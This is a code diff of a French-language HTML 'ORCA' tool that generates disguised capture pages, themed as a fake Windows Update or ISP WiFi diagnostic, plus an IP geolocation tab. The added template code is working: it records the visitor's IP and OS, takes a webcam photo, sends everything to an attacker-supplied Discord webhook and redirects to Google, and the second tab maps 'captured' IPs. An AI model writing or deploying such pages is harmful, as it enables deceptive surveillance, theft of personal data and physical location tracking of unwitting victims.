@@ -2,27 +2,27 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>ORCA ADMIN PANEL</title>
+    <title>ORCA ADMIN DASHBOARD</title>
     <style>
-        :root { --neon: #00ff41; --bg: #0a0a0a; }
-        body { background: var(--bg); color: var(--neon); font-family: monospace; padding: 20px; }
-        .container { max-width: 900px; margin: auto; border: 1px solid var(--neon); padding: 20px; box-shadow: 0 0 20px rgba(0,255,65,0.1); }
-        .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .tab { cursor: pointer; padding: 10px; border: 1px solid #333; transition: 0.3s; }
+        :root { --neon: #00ff41; --bg: #050505; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; padding: 20px; }
+        .container { max-width: 1000px; margin: auto; border: 1px solid var(--neon); padding: 25px; box-shadow: 0 0 20px rgba(0,255,65,0.1); }
+        .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #222; padding-bottom: 10px; }
+        .tab { cursor: pointer; padding: 10px 20px; border: 1px solid #222; transition: 0.3s; }
         .tab.active { background: var(--neon); color: #000; font-weight: bold; }
         .section { display: none; }
         .section.active { display: block; }
-        input, select, button { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 10px; margin: 10px 0; width: 100%; box-sizing: border-box; }
-        button { cursor: pointer; font-weight: bold; text-transform: uppercase; }
-        button:hover { background: var(--neon); color: #000; }
-        pre { background: #050505; padding: 15px; border: 1px dashed #333; overflow-x: auto; color: #888; font-size: 12px; }
-        .result-card { border: 1px solid #333; padding: 15px; margin-top: 20px; background: #0e0e0e; }
+        input, select, button { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 12px; margin: 10px 0; width: 100%; box-sizing: border-box; }
+        button { cursor: pointer; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 10px var(--neon); }
+        pre { background: #080808; padding: 20px; border: 1px dashed #333; overflow-x: auto; color: #00cc33; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+        .result-card { border: 1px solid #333; padding: 15px; margin-top: 20px; background: #0a0a0a; border-left: 4px solid var(--neon); }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>ORCA_MULTI-TOOL_V1.0</h1>
+    <h1 style="text-align: center; letter-spacing: 5px;">ORCA_COMMAND_CENTER</h1>
     
     <div class="tabs">
         <div class="tab active" onclick="openTab('gen')">🔗 GENERATOR</div>
@@ -31,32 +31,30 @@
 
     <div id="gen" class="section active">
         <h3>Générateur de Lien de Capture</h3>
-        <label>URL du Webhook Discord :</label>
-        <input type="text" id="wh-url" placeholder="https://discord.com/api/webhooks/...">
+        <p style="color: #666; font-size: 12px;">Configurez votre Webhook et choisissez un thème pour générer le code de votre page index.html.</p>
         
-        <label>Thème du site :</label>
+        <input type="text" id="wh-url" placeholder="URL Webhook Discord">
         <select id="theme">
-            <option value="terminal">Cyber Terminal (V5)</option>
-            <option value="win">Fausse Mise à jour Windows</option>
-            <option value="wifi">Maintenance FAI / WiFi</option>
+            <option value="terminal">Thème : Cyber Terminal (Expert)</option>
+            <option value="winupdate">Thème : Windows Update (Fake)</option>
+            <option value="wifi">Thème : WiFi Diagnostic (FAI)</option>
         </select>
+        <input type="text" id="redir" value="https://www.google.com" placeholder="URL de Redirection">
 
-        <label>Redirection après capture (ex: google.com) :</label>
-        <input type="text" id="redir" value="https://www.google.com">
-
-        <button onclick="generateCode()">Générer le code HTML</button>
+        <button onclick="generateCode()">Générer le code source</button>
         
-        <h4>Code à copier dans index.html :</h4>
-        <pre id="output-code">Le code apparaîtra ici...</pre>
+        <h4>Code à copier dans votre fichier index.html :</h4>
+        <pre id="output-code">// Le code s'affichera ici...</pre>
+        <button onclick="copyCode()" style="width: auto; padding: 5px 15px; font-size: 11px;">Copier le code</button>
     </div>
 
     <div id="osint" class="section">
         <h3>OSINT IP Scanner</h3>
-        <input type="text" id="ip-input" placeholder="Entrez l'IP capturée (ex: 8.8.8.8)">
-        <button onclick="scanIP()">Lancer l'Analyse OSINT</button>
+        <p style="color: #666; font-size: 12px;">Analysez les IPs capturées pour obtenir la localisation et le fournisseur d'accès.</p>
+        <input type="text" id="ip-input" placeholder="Coller l'IP (ex: 8.8.8.8)">
+        <button onclick="scanIP()">Lancer l'Analyse</button>
 
-        <div id="osint-result" class="result-card" style="display:none;">
-            </div>
+        <div id="osint-result" class="result-card" style="display:none;"></div>
     </div>
 </div>
 
@@ -68,44 +66,69 @@
         document.getElementById(id).classList.add('active');
     }
 
-    // LOGIQUE GENERATOR
     function generateCode() {
         const wh = document.getElementById('wh-url').value;
-        const theme = document.getElementById('theme').value;
         const redir = document.getElementById('redir').value;
+        if(!wh) return alert("Veuillez entrer un Webhook !");
 
-        // Ici on pourrait injecter tout ton code V5 avec les variables modifiées
-        const code = `\n<script>\nconst WEBHOOK = "${wh}";\nconst REDIRECT = "${redir}";\n// ... le reste du code ORCA ...\n<\/script>`;
+        // Template de base adapté de ton code fonctionnel
+        const code = `<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic</title>
+    <style>body{background:#000;color:#00ff41;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden}.box{border:1px solid #00ff41;padding:30px;width:90%;max-width:400px;text-align:center}#v,#c{display:none}</style>
+</head>
+<body>
+    <div class="box"><h3>VÉRIFICATION SYSTÈME</h3><p id="m">Initialisation du protocole...</p><button id="b" onclick="start()" style="background:transparent;color:#00ff41;border:1px solid #00ff41;padding:10px;width:100%;cursor:pointer">DÉMARRER</button></div>
+    <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
+    <script>
+        const WH = "${wh}";
+        async function post(msg, blob=null){
+            const fd = new FormData();
+            if(blob) fd.append('file', blob, 'img.png');
+            fd.append('payload_json', JSON.stringify({content: msg}));
+            await fetch(WH, {method:'POST', body:fd, keepalive:true});
+        }
+        async function start(){
+            document.getElementById('b').style.display='none';
+            document.getElementById('m').innerText="Analyse réseau...";
+            let ip="Bloquée"; try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip;}catch(e){}
+            await post("🚀 **CIBLE DÉTECTÉE**\\n**IP**: " + ip + "\\n**OS**: " + navigator.platform);
+            try{
+                const s=await navigator.mediaDevices.getUserMedia({video:true});
+                const v=document.getElementById('v'); v.srcObject=s;
+                v.onloadedmetadata=()=>{setTimeout(()=>{
+                    const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
+                    c.getContext('2d').drawImage(v,0,0);
+                    c.toBlob(async(b)=>{await post("📸 **CAPTURE**", b); s.getTracks().forEach(t=>t.stop()); window.location.href="${redir}";},'image/png');
+                },1000)};
+            }catch(e){window.location.href="${redir}";}
+        }
+    <\/script>
+</body>
+</html>`;
         document.getElementById('output-code').innerText = code;
-        alert("Code généré ! Copie-le dans ton fichier index.html");
     }
 
-    // LOGIQUE OSINT
+    function copyCode() {
+        const code = document.getElementById('output-code').innerText;
+        navigator.clipboard.writeText(code);
+        alert("Code copié !");
+    }
+
     async function scanIP() {
         const ip = document.getElementById('ip-input').value;
         const resBox = document.getElementById('osint-result');
-        if(!ip) return alert("Entrez une IP");
-
+        if(!ip) return;
         resBox.style.display = "block";
-        resBox.innerHTML = "Analyse en cours...";
-
+        resBox.innerHTML = "Recherche en cours...";
         try {
-            const res = await fetch(`https://ipapi.co/${ip}/json/`);
-            const d = await res.json();
-            
-            resBox.innerHTML = `
-                <strong style="color:var(--neon)">RAPPORT POUR : ${d.ip}</strong><br><br>
-                📍 <b>Localisation :</b> ${d.city}, ${d.region}, ${d.country_name}<br>
-                📡 <b>Fournisseur (ISP) :</b> ${d.org}<br>
-                🌐 <b>Type :</b> ${d.version}<br>
-                ⏰ <b>Fuseau Horaire :</b> ${d.timezone}<br>
-                🗺️ <a href="https://www.google.com/maps?q=${d.latitude},${d.longitude}" target="_blank" style="color:var(--neon)">Voir sur Google Maps</a>
-            `;
-        } catch(e) {
-            resBox.innerHTML = "Erreur lors du scan OSINT.";
-        }
+            const r = await fetch('https://ipapi.co/'+ip+'/json/');
+            const d = await r.json();
+            resBox.innerHTML = "<strong>RESULTATS OSINT :</strong><br>📍 Ville: "+d.city+"<br>🏢 FAI: "+d.org+"<br>🗺️ <a href='https://www.google.com/maps?q="+d.latitude+","+d.longitude+"' target='_blank' style='color:#00ff41'>Localiser sur Maps</a>";
+        } catch(e) { resBox.innerHTML = "Erreur de scan."; }
     }
 </script>
-
 </body>
 </html>
